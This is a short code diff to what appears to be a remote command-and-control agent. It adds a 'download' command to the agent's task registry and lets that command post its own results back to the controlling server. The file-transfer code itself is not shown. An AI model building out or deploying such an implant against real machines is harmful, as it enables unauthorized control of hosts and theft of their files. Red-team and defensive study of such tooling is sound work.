@@ -16,6 +16,7 @@ from commands import exit as cmd_exit
 from commands import ls as cmd_ls
 from commands import cd as cmd_cd
 from commands import pwd as cmd_pwd
+from commands import download as cmd_download
 
 
 # --- Injected by builder via string substitution ---
@@ -108,7 +109,8 @@ COMMANDS = {
     "exit":  cmd_exit.execute,
     "ls":    cmd_ls.execute,
     "cd":    cmd_cd.execute,
-    "pwd":   cmd_pwd.execute,
+    "pwd":      cmd_pwd.execute,
+    "download": cmd_download.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
@@ -121,7 +123,9 @@ def handle_task(task, callback_id):
     handler = COMMANDS.get(cmd)
     if handler:
         output = handler(params, task_id, callback_id)
-        post_response(callback_id, task_id, output)
+        # None means the command handled its own posting (e.g. download)
+        if output is not None:
+            post_response(callback_id, task_id, output)
         # Exit must terminate the process after the response is sent
         if cmd == "exit":
             sys.exit(0)
